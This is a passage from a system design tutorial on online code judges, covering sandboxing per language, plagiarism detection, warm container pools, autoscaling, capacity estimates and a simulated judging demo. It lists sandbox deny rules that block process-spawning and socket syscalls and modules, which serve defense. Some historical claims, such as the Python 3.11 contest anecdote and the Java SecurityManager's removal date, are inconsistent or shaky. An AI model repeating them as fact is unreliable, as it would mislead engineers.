- **Output comparison:** trim trailing whitespace, normalize line endings — many wrong answer bugs are whitespace issues

**Special judges** are separate programs that receive `(input, expected_output, actual_output)` and print `OK` or `WRONG`. Used for floating-point problems (accept output within 1e-6), multiple valid answers, or problems where the checker needs to verify a mathematical property.

---

## 5. Language-specific considerations

{: class="marginalia" }
Python is 10–100× slower<br/>than C++ for the same<br/>algorithm. LeetCode gives<br/>Python 5× more time than<br/>C++ to make the judge<br/>fair across languages.

Each language has unique sandboxing requirements and performance characteristics:

<table class="lang-table">
  <thead>
    <tr>
      <th>Language</th>
      <th>Time multiplier</th>
      <th>Memory limit</th>
      <th>Compilation</th>
      <th>Key sandbox flags</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><span class="lang-badge lang-cpp">C++</span></td>
      <td>1× (baseline)</td>
      <td>256 MB</td>
      <td>g++ -O2 -fsanitize=address,undefined</td>
      <td><code style="font-size:.75rem;">--read-only</code>, seccomp profile</td>
    </tr>
    <tr>
      <td><span class="lang-badge lang-java">Java</span></td>
      <td>2× (JVM warmup)</td>
      <td>512 MB (JVM heap)</td>
      <td>javac, then java -Xmx256m</td>
      <td>SecurityManager, no exec()</td>
    </tr>
    <tr>
      <td><span class="lang-badge lang-py">Python</span></td>
      <td>5× (interpreter)</td>
      <td>256 MB</td>
      <td>none (interpreted)</td>
      <td>restrict os, subprocess, socket modules</td>
    </tr>
    <tr>
      <td><span class="lang-badge lang-js">JavaScript</span></td>
      <td>2×</td>
      <td>256 MB</td>
      <td>none (Node.js)</td>
      <td>--no-experimental-fetch, block fs.writeFile</td>
    </tr>
  </tbody>
</table>

**C++** — The most dangerous language to sandbox. Users can call `system()`, `exec()`, open arbitrary file descriptors. Mitigations:
- Compile with `-fsanitize=address,undefined` to catch memory errors early
- Apply a **seccomp** (secure computing) filter to allow only specific syscalls: `read`, `write`, `exit`, basic math — block `execve`, `fork`, `socket`
- Strip the binary after compilation to remove debug symbols

**Java** — The JVM takes 200–300ms to warm up. Subtract this from the measured time. Use `-Xmx256m -Xms32m` to control heap. The JVM's built-in SecurityManager (deprecated in Java 17, removed in 21 — use a custom ClassLoader restriction) can block file I/O and network calls.

**Python** — Restrict dangerous modules via a custom `import` hook or by deleting them from `sys.modules`. Running inside a Docker container with `--read-only` already prevents filesystem writes. The `resource` module can set `RLIMIT_CPU` and `RLIMIT_AS` from inside the process.

**JavaScript (Node.js)** — Node 18+ supports the `--permission` flag to disable filesystem write access and network. Older versions: override `require('fs').writeFile` and `require('net').connect` in a wrapper script loaded with `--require`.

---

## 6. Plagiarism detection

{: class="marginalia" }
MOSS (Measure of Software<br/>Similarity) was created at<br/>Stanford in 1994 and is<br/>still the gold standard<br/>for academic plagiarism<br/>detection. It uses<br/>Winnowing fingerprinting.

Plagiarism detection runs **asynchronously** — it is not in the critical path of judging. After a submission is accepted, a background job compares it against other accepted solutions for the same problem.

**Three approaches, increasing sophistication:**

**Token-based comparison** — tokenize the code (strip variable names, map all identifiers to a canonical form), then compare token sequences using similarity metrics like Jaccard similarity or edit distance. Fast but fooled by variable renaming.

**AST comparison** — parse both programs to their Abstract Syntax Trees, then compare tree structure. Variable names are ignored. Reordering statements that are independent may fool this. Used by tools like JPlag.

**MOSS fingerprinting** — select representative substrings (k-grams) from the program using the Winnowing algorithm, hash them, compare hash sets across submissions. Robust to reformatting, variable renaming, and statement reordering. The classic choice.

<div class="card">
<strong style="color:#fbef8a;">Practical pipeline:</strong>
<ol style="margin:.8rem 0 0;padding-left:1.3rem;color:rgba(255,255,255,.75);line-height:2.1;font-size:.84rem;">
  <li>Submission accepted → enqueue plagiarism job (low priority queue)</li>
  <li>Normalize code: strip comments, whitespace, rename variables to <code>v1</code>, <code>v2</code>...</li>
  <li>Compute MOSS fingerprint</li>
  <li>Compare against top-50 accepted solutions (by runtime similarity)</li>
  <li>If similarity > 85% → flag for human review</li>
  <li>Human reviewer confirms or dismisses the flag</li>
</ol>
</div>

<div class="callout callout-yellow">
<strong>Important:</strong> plagiarism detection is probabilistic and generates false positives. Many short solutions to the same problem are legitimately identical (there is only one way to write <em>Two Sum</em> with a hash map). Always have human review before taking action.
</div>

---

## 7. Scaling

<div class="stat-grid">
  <div class="stat-card">
    <div class="stat-num">~500</div>
    <div class="stat-label">Judge Workers (peak)</div>
  </div>
  <div class="stat-card">
    <div class="stat-num">~100</div>
    <div class="stat-label">Submissions / second</div>
  </div>
  <div class="stat-card">
    <div class="stat-num">200ms</div>
    <div class="stat-label">Warm container start</div>
  </div>
</div>

**Judge Worker pool — autoscale on queue depth:**

The queue depth (number of pending jobs) is the primary scaling signal. With Kubernetes HPA and a custom metrics adapter:
- Queue depth > 50 → scale up workers
- Queue depth < 5 for 5 minutes → scale down

Each worker handles one submission at a time. At ~2s average execution time and 100 submissions/second, you need ~200 workers at steady state — with headroom to ~500 for contest bursts.

**Warm container pool:**

Cold-starting a Docker container takes 1–3 seconds (pulling layers, initializing the runtime). During peak load, this adds noticeable latency. Solution: maintain a pool of pre-started containers per language:
- Worker picks up a warm container instead of cold-starting
- Container is destroyed after one use (fresh container = no state leakage)
- A separate pool manager continuously refills the warm pool

**Container reuse (for trusted languages):**

For JavaScript with a locked-down runtime, the container can be reused across submissions. Between submissions: reset the sandbox directory, reload the Node.js process. ~50ms reset vs ~200ms cold start. Used only when the language runtime can be reliably reset.

<div class="code-wrap">
  <div class="code-lang"><span>Warm Container Pool — pseudocode</span></div>
  <pre class="code-block"><span class="kw">class</span> <span class="ty">WarmPool</span>:
  <span class="kw">def</span> <span class="fn">__init__</span>(self, language, target_size<span class="op">=</span><span class="nu">10</span>):
    self.language    <span class="op">=</span> language
    self.target_size <span class="op">=</span> target_size
    self.pool        <span class="op">=</span> <span class="ty">Queue</span>()
    self.<span class="fn">_refill_loop</span>()

  <span class="kw">async def</span> <span class="fn">_refill_loop</span>(self):
    <span class="kw">while</span> <span class="kw">True</span>:
      <span class="kw">while</span> self.pool.<span class="fn">size</span>() <span class="op"><</span> self.target_size:
        c <span class="op">=</span> <span class="kw">await</span> <span class="fn">startContainer</span>(self.language)
        self.pool.<span class="fn">put</span>(c)
      <span class="kw">await</span> <span class="fn">sleep</span>(<span class="nu">100</span>)  <span class="cm">// check every 100ms</span>

  <span class="kw">async def</span> <span class="fn">acquire</span>(self):
    <span class="kw">if</span> self.pool.<span class="fn">empty</span>():
      <span class="kw">return await</span> <span class="fn">startContainer</span>(self.language)  <span class="cm">// cold start fallback</span>
    <span class="kw">return</span> self.pool.<span class="fn">get</span>()

  <span class="kw">def</span> <span class="fn">release</span>(self, container):
    <span class="fn">destroyContainer</span>(container)  <span class="cm">// never return to pool — single use</span></pre>
</div>

**Geographic placement:**

Judge workers should run in the same region as the users. A submission from a user in Singapore that is judged in Virginia has 150ms of network RTT added to the wait time — for a fast algorithm that finishes in 50ms, that is the dominant latency. Use CDN routing and regional worker deployments.

---

## 8. Interactive code judge demo

<div class="judge-demo">
  <h3>⚡ Mini Code Judge — try it</h3>
  <p style="color:rgba(255,255,255,.6);font-size:.82rem;margin:0 0 1rem;"><strong style="color:#fbef8a;">Problem:</strong> Given an array of integers, return their sum. Input: space-separated integers. Output: a single integer.</p>

  <div class="judge-top">
    <div>
      <div class="sb-label" style="margin-bottom:.4rem;">Scenario</div>
      <div class="scenario-btns">
        <button class="scenario-btn active" onclick="loadScenario('correct')">✓ Correct solution</button>
        <button class="scenario-btn" onclick="loadScenario('wrong')">✗ Wrong answer</button>
        <button class="scenario-btn" onclick="loadScenario('tle')">⏱ Infinite loop (TLE)</button>
      </div>
    </div>
    <div>
      <div class="sb-label" style="margin-bottom:.4rem;">Language</div>
      <select class="lang-select" id="judge-lang">
        <option value="python">Python 3</option>
        <option value="js">JavaScript</option>
        <option value="pseudo">Pseudocode</option>
      </select>
    </div>
  </div>

  <textarea id="judge-editor" class="judge-editor">nums = list(map(int, input().split()))
print(sum(nums))</textarea>

  <div class="sb-label" style="margin-bottom:.5rem;">Test cases</div>
  <div class="tc-grid" id="tc-grid">
    <div class="tc-card" id="tc-0"><div class="tc-label">TC #1</div><div class="tc-input">1 2 3 → 6</div><div class="tc-status">–</div></div>
    <div class="tc-card" id="tc-1"><div class="tc-label">TC #2</div><div class="tc-input">10 -5 → 5</div><div class="tc-status">–</div></div>
    <div class="tc-card" id="tc-2"><div class="tc-label">TC #3</div><div class="tc-input">0 0 0 → 0</div><div class="tc-status">–</div></div>
    <div class="tc-card" id="tc-3"><div class="tc-label">TC #4</div><div class="tc-input">100 → 100</div><div class="tc-status">–</div></div>
    <div class="tc-card" id="tc-4"><div class="tc-label">TC #5</div><div class="tc-input">-1 -2 -3 → -6</div><div class="tc-status">–</div></div>
  </div>

  <div style="display:flex;gap:.6rem;margin-bottom:.8rem;align-items:center;">
    <button class="btn-primary" id="submit-btn" onclick="runJudge()">▶ Submit</button>
    <span id="judge-status" style="font-size:.8rem;color:rgba(255,255,255,.4);"></span>
  </div>
  <div class="judge-verdict" id="judge-verdict">Waiting for submission...</div>
</div>

<script>
var scenarios = {
  correct: {
    python: "nums = list(map(int, input().split()))\nprint(sum(nums))",
    js: "const nums = require('fs').readFileSync('/dev/stdin','utf8').trim().split(' ').map(Number);\nconsole.log(nums.reduce((a,b) => a+b, 0));",
    pseudo: "nums = readLine().split(' ').map(toInt)\nprint(sum(nums))"
  },
  wrong: {
    python: "nums = list(map(int, input().split()))\nprint(sum(nums) + 1)  # off-by-one bug",
    js: "const nums = require('fs').readFileSync('/dev/stdin','utf8').trim().split(' ').map(Number);\nconsole.log(nums.reduce((a,b) => a+b, 1));",
    pseudo: "nums = readLine().split(' ').map(toInt)\nprint(sum(nums) + 1)  // off-by-one bug"
  },
  tle: {
    python: "import time\nnums = list(map(int, input().split()))\nwhile True:  # infinite loop\n    pass\nprint(sum(nums))",
    js: "const nums = [];\nwhile(true) {}  // infinite loop\nconsole.log(0);",
    pseudo: "nums = readLine().split(' ').map(toInt)\nloop forever:\n    // do nothing\nprint(sum(nums))"
  }
};

var tcData = [
  { input: "1 2 3",       expected: 6,   display: "1 2 3 → 6"    },
  { input: "10 -5",       expected: 5,   display: "10 -5 → 5"    },
  { input: "0 0 0",       expected: 0,   display: "0 0 0 → 0"    },
  { input: "100",         expected: 100, display: "100 → 100"     },
  { input: "-1 -2 -3",    expected: -6,  display: "-1 -2 -3 → -6" }
];

var currentScenario = 'correct';

function loadScenario(name) {
  currentScenario = name;
  document.querySelectorAll('.scenario-btn').forEach(function(b) { b.classList.remove('active'); });
  event.target.classList.add('active');
  var lang = document.getElementById('judge-lang').value;
  document.getElementById('judge-editor').value = scenarios[name][lang];
  resetTcs();
  document.getElementById('judge-verdict').textContent = 'Waiting for submission...';
  document.getElementById('judge-status').textContent = '';
}

document.getElementById('judge-lang').addEventListener('change', function() {
  document.getElementById('judge-editor').value = scenarios[currentScenario][this.value];
});

function resetTcs() {
  for (var i = 0; i < 5; i++) {
    var c = document.getElementById('tc-' + i);
    c.className = 'tc-card';
    c.querySelector('.tc-status').textContent = '–';
  }
}

function evalSum(input) {
  return input.trim().split(/\s+/).map(Number).reduce(function(a, b) { return a + b; }, 0);
}

function runJudge() {
  var btn = document.getElementById('submit-btn');
  var status = document.getElementById('judge-status');
  var verdict = document.getElementById('judge-verdict');
  btn.disabled = true;
  resetTcs();
  verdict.innerHTML = '<span style="color:#fbef8a;">⏳ Queuing submission...</span>';
  status.textContent = '';

  var isTLE = currentScenario === 'tle';
  var isWrong = currentScenario === 'wrong';
  var tlimit = isTLE ? 800 : 500;
  var timings = [120, 118, 121, 119, 123];
  var mems = [14200, 14100, 14300, 14150, 14250];

  setTimeout(function() {
    verdict.innerHTML = '<span style="color:rgba(255,255,255,.5);">🔒 Spinning up sandbox container (warm pool)... 185ms</span>\n<span style="color:rgba(255,255,255,.5);">💉 Injecting solution code...</span>';

    var i = 0;
    function runNextTc() {
      if (i >= 5) return;
      var c = document.getElementById('tc-' + i);
      c.className = 'tc-card running';
      c.querySelector('.tc-status').textContent = '⏳';
      status.textContent = 'Running test case ' + (i+1) + '/5...';

      var delay = isTLE ? tlimit : 200 + Math.random() * 150;
      setTimeout(function(idx) {
        var card = document.getElementById('tc-' + idx);
        if (isTLE) {
          card.className = 'tc-card fail';
          card.querySelector('.tc-status').innerHTML = '<span class="verdict-tle">TLE</span>';
          verdict.innerHTML = '<span class="verdict-tle">⏱ Time Limit Exceeded</span>\n' +
            '<span style="color:rgba(255,255,255,.5);">Test case ' + (idx+1) + ': time limit (2000ms) exceeded\nExecution killed after ' + tlimit + 'ms</span>';
          status.textContent = '';
          btn.disabled = false;
          return;
        }
        var expected = tcData[idx].expected;
        var got = isWrong ? expected + 1 : expected;
        var pass = got === expected;
        card.className = 'tc-card ' + (pass ? 'pass' : 'fail');
        card.querySelector('.tc-status').innerHTML = pass ?
          '<span class="verdict-accepted">✓</span>' :
          '<span class="verdict-re">✗</span>';

        if (!pass) {
          verdict.innerHTML =
            '<span style="color:#f08080;">✗ Wrong Answer</span>\n' +
            '<span style="color:rgba(255,255,255,.5);">Test case ' + (idx+1) + ' failed:\n' +
            '  Input:    ' + tcData[idx].input + '\n' +
            '  Expected: ' + expected + '\n' +
            '  Got:      ' + got + '</span>';
          status.textContent = '';
          btn.disabled = false;
          return;
        }

        i++;
        if (i === 5) {
          var totalTime = timings.reduce(function(a,b){return a+b;},0);
          var maxMem = Math.max.apply(null, mems);
          verdict.innerHTML =
            '<span class="verdict-accepted">✓ Accepted</span>\n' +
            '<span style="color:rgba(255,255,255,.5);">All 5 test cases passed\n' +
            'Runtime: ' + timings[4] + ' ms  (beats 87.3% of Python submissions)\n' +
            'Memory:  ' + (maxMem / 1024).toFixed(1) + ' MB</span>\n\n' +
            '<span style="color:rgba(255,255,255,.3);font-size:.75rem;">Per-test: ' +
            timings.map(function(t, j) { return 'TC' + (j+1) + ':' + t + 'ms/' + (mems[j]/1024).toFixed(1) + 'MB'; }).join('  ') +
            '</span>';
          status.textContent = '';
          btn.disabled = false;
        } else {
          runNextTc();
        }
      }.bind(null, i), delay);
    }

    setTimeout(runNextTc, 300);
  }, 400);
}
</script>

---

## 9. Capacity estimate

<table class="cap-table">
  <thead>
    <tr><th>Metric</th><th>Value</th></tr>
  </thead>
  <tbody>
    <tr><td>Submissions / day (LeetCode scale)</td><td>~1 million</td></tr>
    <tr><td>Peak submissions / second (contest)</td><td>~100 / sec</td></tr>
    <tr><td>Average execution time per submission</td><td>~1–2 seconds</td></tr>
    <tr><td>Judge workers needed (steady state)</td><td>~200</td></tr>
    <tr><td>Judge workers needed (peak burst)</td><td>~500</td></tr>
    <tr><td>Warm container pool size (per language)</td><td>~50 containers</td></tr>
    <tr><td>Container boot time (warm pool)</td><td>~180–220 ms</td></tr>
    <tr><td>Container boot time (cold start)</td><td>~1.5–3 seconds</td></tr>
    <tr><td>Code storage per submission (compressed)</td><td>~5 KB avg</td></tr>
    <tr><td>Total code storage per year</td><td>~1.8 TB (1M/day × 365 × 5KB)</td></tr>
    <tr><td>Result storage per submission</td><td>~1 KB (verdict + per-test stats)</td></tr>
    <tr><td>Total result storage per year</td><td>~365 GB</td></tr>
    <tr><td>Queue message size</td><td>~2 KB (code + metadata)</td></tr>
    <tr><td>Network bandwidth (queue + DB)</td><td>~5 MB/s at peak</td></tr>
  </tbody>
</table>

<div class="callout callout-green">
<strong>Scaling rule of thumb:</strong> (peak submissions/sec) × (avg execution time in seconds) = workers needed. At 100/sec × 2s average = 200 workers at steady state. Add 2.5× headroom for burst = 500 workers. Each worker is a single container, so this is 500 containers worth of CPU — roughly 250 vCPUs at 0.5 CPU per container.
</div>

---

## Summary: system design checklist

<div class="card">
<strong style="color:#fbef8a;">Online Code Judge — key decisions</strong>
<table style="width:100%;border-collapse:collapse;font-size:.82rem;margin-top:.8rem;">
  <tr style="border-bottom:1px solid rgba(255,255,255,.08);">
    <td style="padding:7px 0;color:rgba(255,255,255,.5);width:40%;">Sandbox</td>
    <td style="padding:7px 0;color:rgba(255,255,255,.8);">Docker with --network none, --memory, --read-only, --pids-limit + seccomp profile</td>
  </tr>
  <tr style="border-bottom:1px solid rgba(255,255,255,.08);">
    <td style="padding:7px 0;color:rgba(255,255,255,.5);">Queue</td>
    <td style="padding:7px 0;color:rgba(255,255,255,.8);">Redis Streams or AWS SQS — durable, at-least-once delivery, dead-letter queue for failures</td>
  </tr>
  <tr style="border-bottom:1px solid rgba(255,255,255,.08);">
    <td style="padding:7px 0;color:rgba(255,255,255,.5);">Result delivery</td>
    <td style="padding:7px 0;color:rgba(255,255,255,.8);">WebSocket push via Redis pub/sub; polling as fallback</td>
  </tr>
  <tr style="border-bottom:1px solid rgba(255,255,255,.08);">
    <td style="padding:7px 0;color:rgba(255,255,255,.5);">Time measurement</td>
    <td style="padding:7px 0;color:rgba(255,255,255,.8);">Host-side wall clock + cgroup cpuacct.usage — never trust self-reported time</td>
  </tr>
  <tr style="border-bottom:1px solid rgba(255,255,255,.08);">
    <td style="padding:7px 0;color:rgba(255,255,255,.5);">Memory measurement</td>
    <td style="padding:7px 0;color:rgba(255,255,255,.8);">cgroup memory.max_usage_in_bytes — peak high-water mark</td>
  </tr>
  <tr style="border-bottom:1px solid rgba(255,255,255,.08);">
    <td style="padding:7px 0;color:rgba(255,255,255,.5);">Cold start latency</td>
    <td style="padding:7px 0;color:rgba(255,255,255,.8);">Pre-warm container pool of ~50 containers per language</td>
  </tr>
  <tr style="border-bottom:1px solid rgba(255,255,255,.08);">
    <td style="padding:7px 0;color:rgba(255,255,255,.5);">Autoscaling</td>
    <td style="padding:7px 0;color:rgba(255,255,255,.8);">Kubernetes HPA on queue depth metric — scale up fast, scale down slow</td>
  </tr>
  <tr>
    <td style="padding:7px 0;color:rgba(255,255,255,.5);">Higher isolation</td>
    <td style="padding:7px 0;color:rgba(255,255,255,.8);">gVisor (runsc) for maximum security; Firecracker microVMs for VM-level isolation</td>
  </tr>
</table>
</div>

---

{: class="marginalia" }
LeetCode runs on AWS.<br/>Their judging infrastructure<br/>uses a combination of ECS<br/>(Elastic Container Service)<br/>and custom-built judge<br/>workers. The company<br/>processes over 1 million<br/>code submissions per day<br/>at peak contest times.

LeetCode's infrastructure runs on Amazon ECS. Their judge workers are custom-built containers that receive jobs from an internal queue. At peak contest times — when tens of thousands of participants submit simultaneously — the queue acts as a buffer, absorbing burst load that would overwhelm a synchronous system. The warm container pool keeps perceived latency low even when the queue is deep: you wait for a worker, but once a worker picks up your job, the container is ready immediately.

{: class="marginalia" }
The 2022 LeetCode Weekly<br/>Contest had a famous<br/>incident: a Python solution<br/>that should have TLE'd<br/>was accepted because<br/>Python 3.11 optimizations<br/>made an O(n³) solution<br/>fast enough. The community<br/>debated the validity<br/>for days.

The strictness of judging matters enormously for competitive programming. A 2022 incident: Python 3.11 introduced significant performance improvements (the "Faster CPython" project). Solutions that were accepted for years suddenly started failing after a Python version upgrade — and some O(n²) solutions that should have timed out started passing. Maintaining separate per-language time limits that account for interpreter version performance is a continuous maintenance burden.

{: class="marginalia" }
gVisor (used by Google<br/>Cloud Run and App Engine)<br/>implements a Linux kernel<br/>in Go running in userspace.<br/>Syscalls from the sandboxed<br/>process go to gVisor's<br/>kernel — even if the<br/>process exploits a kernel<br/>bug, it exploits gVisor,<br/>not the host OS kernel.

gVisor's approach is elegant: instead of letting user processes talk to the Linux kernel directly (with all its exploitable surface area), gVisor interposes a userspace kernel. Every syscall from the sandboxed process is handled by gVisor's Sentry component, written in Go, which either handles it internally or translates it to a safe subset of host syscalls. The attack surface shrinks from the entire Linux kernel to gVisor's much smaller, memory-safe Go implementation. Google Cloud Run and Cloud Functions run on gVisor — it is production-hardened at planetary scale.
